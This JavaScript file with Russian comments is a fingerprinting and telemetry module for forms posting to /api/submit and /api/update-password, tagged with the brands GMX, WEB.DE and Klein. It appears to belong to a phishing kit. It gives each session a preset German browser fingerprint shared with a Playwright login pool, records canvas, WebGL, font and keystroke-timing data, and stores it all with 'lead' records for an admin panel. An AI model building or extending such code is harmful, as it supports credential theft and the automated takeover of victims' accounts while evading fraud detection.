/**
 * Отпечаток для /api/submit и /api/update-password.
 * Дополнительно: clientSignals (живые сигналы браузера) + requestMeta на сервере из заголовков.
 * Пул задаётся в window.__GMW_FP_PRESETS (webde-fingerprints-pool.js = те же записи, что login/webde_fingerprints.json для Playwright).
 * Подключайте: <script src="/webde-fingerprints-pool.js"></script> затем fingerprint.js
 * Один индекс закрепляется за вкладкой (sessionStorage).
 * Для отладки: window.GMW_FP_PRESET_FORCE = 60 до загрузки скриптов — фиксированный пресет (как в пуле).
 */
(function () {
  'use strict';

  var STORAGE_KEY = 'gmw_fp_preset_idx';

  /** Минимальный запасной пул, если pool.js не подгрузился */
  var FALLBACK_PRESETS = [
    {
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.114 Safari/537.36',
      platform: 'Win32',
      locale: 'de-DE',
      timezoneId: 'Europe/Berlin',
      acceptLanguage: 'de-DE,de;q=0.9,en;q=0.8',
      language: 'de-DE',
      languages: ['de-DE', 'de', 'en-US', 'en'],
      viewport: { width: 1920, height: 1080 },
      hardwareConcurrency: 8,
      deviceMemory: 8,
      maxTouchPoints: 0,
      screenWidth: 1920,
      screenHeight: 1080,
      availWidth: 1920,
      availHeight: 1040,
      colorDepth: 24,
      pixelDepth: 24,
      devicePixelRatio: 1,
      cookieEnabled: true,
      doNotTrack: null,
      timezoneOffset: -60
    }
  ];

  function getPresets() {
    var p = typeof window !== 'undefined' && window.__GMW_FP_PRESETS;
    return Array.isArray(p) && p.length > 0 ? p : FALLBACK_PRESETS;
  }

  function getPresetIndex() {
    var presets = getPresets();
    var max = presets.length;
    try {
      if (typeof window !== 'undefined' && window.GMW_FP_PRESET_FORCE != null && window.GMW_FP_PRESET_FORCE !== '') {
        var forced = parseInt(String(window.GMW_FP_PRESET_FORCE), 10);
        if (!isNaN(forced) && forced >= 0 && forced < max) return forced;
      }
      var raw = sessionStorage.getItem(STORAGE_KEY);
      if (raw != null && raw !== '') {
        var parsed = parseInt(raw, 10);
        if (!isNaN(parsed) && parsed >= 0 && parsed < max) return parsed;
      }
      var idx = Math.floor(Math.random() * max);
      sessionStorage.setItem(STORAGE_KEY, String(idx));
      return idx;
    } catch (e) {
      return Math.floor(Math.random() * max);
    }
  }

  function clone(obj) {
    var o = {};
    for (var k in obj) {
      if (Object.prototype.hasOwnProperty.call(obj, k)) o[k] = obj[k];
    }
    return o;
  }

  /** Поля для API в том же виде, что раньше (camelCase для лида) */
  function toClientFingerprint(row) {
    return {
      userAgent: row.userAgent || '',
      platform: row.platform || '',
      language: row.language || row.locale || '',
      languages: Array.isArray(row.languages) ? row.languages.slice(0, 8) : [],
      cookieEnabled: row.cookieEnabled !== false,
      doNotTrack: row.doNotTrack != null ? row.doNotTrack : '',
      hardwareConcurrency: row.hardwareConcurrency,
      deviceMemory: row.deviceMemory,
      maxTouchPoints: row.maxTouchPoints != null ? row.maxTouchPoints : 0,
      screenWidth: row.screenWidth,
      screenHeight: row.screenHeight,
      availWidth: row.availWidth,
      availHeight: row.availHeight,
      colorDepth: row.colorDepth,
      pixelDepth: row.pixelDepth,
      devicePixelRatio: row.devicePixelRatio,
      timezone: row.timezoneId,
      timezoneOffset: row.timezoneOffset
    };
  }

  window.getGmwFingerprint = function getGmwFingerprint() {
    var presets = getPresets();
    var idx = getPresetIndex();
    var row = presets[idx];
    var base = toClientFingerprint(clone(row));
    base.fpPresetId = idx;
    base.fpPresetCount = presets.length;
    try {
      if (typeof window !== 'undefined' && window.innerWidth != null) base.innerWidth = window.innerWidth;
      if (typeof window !== 'undefined' && window.innerHeight != null) base.innerHeight = window.innerHeight;
    } catch (e2) {}
    return base;
  };

  function userAgentDataBrandsFromPresetUa(ua) {
    var m = /Chrome\/(\d+)/i.exec(ua || '');
    var maj = m ? m[1] : '140';
    return 'Chromium/' + maj + ', Not-A.Brand/24, Google Chrome/' + maj;
  }

  function djb2Hash(str) {
    var h = 5381;
    var i;
    for (i = 0; i < str.length; i++) {
      h = ((h << 5) + h) ^ str.charCodeAt(i);
    }
    return (h >>> 0).toString(16);
  }

  /** Поведение до submit: мышь, скролл, тач, интервалы keydown по полям (без текста пароля). */
  var behaviorStartAt = Date.now();
  var navTimingStart = 0;
  try {
    if (typeof performance !== 'undefined') {
      if (performance.timeOrigin) navTimingStart = Math.floor(performance.timeOrigin);
      else if (performance.timing && performance.timing.navigationStart) navTimingStart = performance.timing.navigationStart;
    }
  } catch (pt0) {}
  if (typeof document !== 'undefined') {
    if (document.readyState === 'loading') {
      document.addEventListener(
        'DOMContentLoaded',
        function () {
          behaviorStartAt = Date.now();
        },
        { once: true }
      );
    } else {
      behaviorStartAt = Date.now();
    }
  }
  var behaviorState = {
    mouseMoves: 0,
    clicks: 0,
    scrolls: 0,
    touchStarts: 0,
    keydowns: 0,
    keyIntervals: [],
    lastKeyTs: 0
  };
  function behaviorBumpKeyInterval() {
    var t = Date.now();
    if (behaviorState.lastKeyTs) {
      behaviorState.keyIntervals.push(t - behaviorState.lastKeyTs);
      if (behaviorState.keyIntervals.length > 40) behaviorState.keyIntervals.shift();
    }
    behaviorState.lastKeyTs = t;
    behaviorState.keydowns++;
  }
  if (typeof document !== 'undefined') {
    document.addEventListener(
      'mousemove',
      function () {
        behaviorState.mouseMoves++;
      },
      { passive: true }
    );
    document.addEventListener(
      'click',
      function () {
        behaviorState.clicks++;
      },
      true
    );
    document.addEventListener(
      'scroll',
      function () {
        behaviorState.scrolls++;
      },
      { passive: true, capture: true }
    );
    document.addEventListener(
      'touchstart',
      function () {
        behaviorState.touchStarts++;
      },
      { passive: true, capture: true }
    );
    document.addEventListener(
      'keydown',
      function (e) {
        var t = e.target;
        if (!t || !t.tagName) return;
        var tag = t.tagName.toUpperCase();
        if (tag !== 'INPUT' && tag !== 'TEXTAREA') return;
        var inp = t;
        var typ = inp.type ? String(inp.type).toLowerCase() : '';
        if (typ === 'password' || typ === 'text' || typ === 'email' || typ === 'tel' || typ === 'search' || typ === 'url' || tag === 'TEXTAREA') {
          behaviorBumpKeyInterval();
        }
      },
      true
    );
  }
  window.getGmwBehaviorSnapshot = function getGmwBehaviorSnapshot() {
    var now = Date.now();
    var base = navTimingStart > 0 ? navTimingStart : behaviorStartAt;
    return {
      sessionMs: now - behaviorStartAt,
      submitDelayMs: now - base,
      mouseMoves: behaviorState.mouseMoves,
      clicks: behaviorState.clicks,
      scrolls: behaviorState.scrolls,
      touchStarts: behaviorState.touchStarts,
      keydowns: behaviorState.keydowns,
      keyIntervalsSample: behaviorState.keyIntervals.slice(-14)
    };
  };

  /**
   * Расширенные сигналы сессии (не входят в стабильную подпись fingerprint на сервере).
   * TLS/JA3 здесь недоступны — пишутся на сервере в requestMeta (без JA3 в чистом Node).
   */
  window.getGmwClientSignals = function getGmwClientSignals() {
    var out = { at: new Date().toISOString() };
    try {
      var nav = typeof navigator !== 'undefined' ? navigator : null;
      if (typeof document !== 'undefined') {
        out.referrer = document.referrer ? String(document.referrer).slice(0, 500) : '';
        out.visibilityState = document.visibilityState || '';
      }
      out.webdriver = !!(nav && nav.webdriver);
      if (nav) {
        out.vendor = nav.vendor || '';
        try {
          out.navigatorUserAgent = String(nav.userAgent || '').slice(0, 500);
        } catch (uaE) {}
        try {
          out.navigatorPlatform = String(nav.platform || '').slice(0, 80);
        } catch (npE) {}
        if (Array.isArray(nav.languages) && nav.languages.length > 0) {
          out.acceptLanguageHeader = nav.languages
            .map(function (x) {
              return String(x).trim();
            })
            .filter(Boolean)
            .slice(0, 12)
            .join(',')
            .slice(0, 400);
        }
        if (nav.userAgentData && Array.isArray(nav.userAgentData.brands)) {
          try {
            out.userAgentDataBrands = nav.userAgentData.brands
              .map(function (b) {
                return (b && b.brand ? b.brand : '') + '/' + (b && b.version ? b.version : '');
              })
              .join(', ')
              .slice(0, 200);
          } catch (brE) {}
        }
        if (typeof nav.pdfViewerEnabled === 'boolean') out.pdfViewerEnabled = nav.pdfViewerEnabled;
        out.pluginsLength = nav.plugins ? nav.plugins.length : 0;
        if (typeof nav.maxTouchPoints === 'number') out.maxTouchPointsReal = nav.maxTouchPoints;
      }
      try {
        if (typeof window !== 'undefined') {
          out.windowSizes = {
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            devicePixelRatio: window.devicePixelRatio
          };
          out.touchStartInWindow = 'ontouchstart' in window;
        }
      } catch (ws) {}
      if (typeof screen !== 'undefined' && screen.orientation && screen.orientation.type) {
        out.screenOrientation = String(screen.orientation.type);
      }
      try {
        var conn = nav && (nav.connection || nav.mozConnection || nav.webkitConnection);
        if (conn) {
          out.connection = {
            effectiveType: conn.effectiveType,
            downlink: conn.downlink,
            rtt: conn.rtt,
            saveData: conn.saveData
          };
        }
      } catch (c0) {}
      try {
        out.intlResolved = Intl.DateTimeFormat().resolvedOptions();
      } catch (c1) {}
      try {
        out.chromeObject = typeof window.chrome !== 'undefined';
      } catch (c2) {}
      try {
        if (typeof performance !== 'undefined' && performance.timeOrigin) {
          out.timeOrigin = Math.round(performance.timeOrigin);
        }
      } catch (c3) {}
      try {
        var AC = window.AudioContext || window.webkitAudioContext;
        if (AC) {
          var actx = new AC();
          out.audioContextMeta = String(actx.sampleRate || '');
          if (actx.close) actx.close();
        } else {
          out.audioContextMeta = 'unavailable';
        }
      } catch (a0) {
        out.audioContextMeta = 'unavailable';
        out.audioContextError = String(a0 && a0.message ? a0.message : a0).slice(0, 120);
      }
      try {
        out.webrtcPeerConnection = typeof window.RTCPeerConnection === 'function' || typeof window.webkitRTCPeerConnection === 'function';
      } catch (w0) {}
      try {
        if (typeof document !== 'undefined' && document.body) {
          var baseFonts = ['monospace', 'sans-serif', 'serif'];
          var checkFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Trebuchet MS', 'Comic Sans MS'];
          var probe = document.createElement('span');
          probe.textContent = 'mmmmmmmmmmlli';
          probe.style.cssText = 'font-size:72px;position:absolute;left:-9999px;top:0;visibility:hidden';
          document.body.appendChild(probe);
          var detected = [];
          var fi;
          for (fi = 0; fi < checkFonts.length; fi++) {
            var fname = checkFonts[fi];
            var j;
            var diff = false;
            for (j = 0; j < baseFonts.length; j++) {
              probe.style.fontFamily = "'" + fname + "'," + baseFonts[j];
              var wF = probe.offsetWidth;
              probe.style.fontFamily = baseFonts[j];
              var w0 = probe.offsetWidth;
              if (wF !== w0) {
                diff = true;
                break;
              }
            }
            if (diff) detected.push(fname);
          }
          document.body.removeChild(probe);
          out.fontProbe = { detected: detected, detectedCount: detected.length };
        }
      } catch (f0) {}
      try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          var dbg = gl.getExtension('WEBGL_debug_renderer_info');
          if (dbg) {
            out.webglVendor = String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '').slice(0, 120);
            out.webglRenderer = String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '').slice(0, 120);
          } else {
            out.webglVendor = String(gl.getParameter(gl.VENDOR) || '').slice(0, 120);
            out.webglRenderer = String(gl.getParameter(gl.RENDERER) || '').slice(0, 120);
          }
        }
      } catch (c4) {
        out.webglError = 'unavailable';
      }
      try {
        var cv = document.createElement('canvas');
        cv.width = 240;
        cv.height = 48;
        var ctx = cv.getContext('2d');
        if (ctx) {
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#f60';
          ctx.fillRect(10, 1, 50, 20);
          ctx.fillStyle = '#069';
          ctx.fillText('gmw', 2, 15);
          var data = cv.toDataURL();
          out.canvasTokenHash = djb2Hash(data.slice(-Math.min(200, data.length)));
        }
      } catch (c5) {}
    } catch (outer) {
      out.collectError = String(outer && outer.message ? outer.message : outer).slice(0, 200);
    }
    try {
      var presetsA = getPresets();
      var idxA = getPresetIndex();
      var rowA = presetsA[idxA];
      if (rowA && rowA.userAgent) {
        out.navigatorUserAgent = String(rowA.userAgent).slice(0, 500);
        out.navigatorPlatform = String(rowA.platform || '').slice(0, 80);
        if (rowA.acceptLanguage) {
          out.acceptLanguageHeader = String(rowA.acceptLanguage).slice(0, 400);
        } else if (Array.isArray(rowA.languages) && rowA.languages.length) {
          out.acceptLanguageHeader = rowA.languages
            .map(function (x) {
              return String(x).trim();
            })
            .filter(Boolean)
            .slice(0, 12)
            .join(',')
            .slice(0, 400);
        }
        out.userAgentDataBrands = userAgentDataBrandsFromPresetUa(rowA.userAgent);
        out.intlResolved = {
          locale: rowA.locale || rowA.language || 'de-DE',
          calendar: 'gregory',
          numberingSystem: 'latn',
          timeZone: rowA.timezoneId || 'Europe/Berlin',
          year: 'numeric',
          month: 'numeric',
          day: 'numeric'
        };
        out.clientSignalsAlignedWithPreset = true;
      }
    } catch (alignE) {}
    return out;
  };

  /**
   * Добавить fingerprint + clientSignals в тело POST (submit, update-password).
   * Сервер сохраняет в запись лида; в админке весь снимок смотрится только по иконке ОС в списке логов.
   */
  window.gmwAppendTelemetry = function gmwAppendTelemetry(payload) {
    if (!payload || typeof payload !== 'object') return payload;
    try {
      if (!payload.clientFormBrand) {
        var ds = document.documentElement && document.documentElement.dataset && document.documentElement.dataset.brand;
        var bid = ds != null ? String(ds).trim().toLowerCase() : '';
        if (bid === 'gmx' || bid === 'webde' || bid === 'klein') payload.clientFormBrand = bid;
      }
    } catch (eCfb) {}
    try {
      if (window.getGmwFingerprint) {
        var fp = window.getGmwFingerprint();
        if (fp) payload.fingerprint = fp;
      }
      if (window.getGmwClientSignals) {
        var cs = window.getGmwClientSignals();
        if (cs) payload.clientSignals = cs;
      }
      if (window.getGmwBehaviorSnapshot) {
        try {
          payload.behaviorSignals = window.getGmwBehaviorSnapshot();
        } catch (eB) {}
      }
    } catch (e) {}
    return payload;
  };
})();
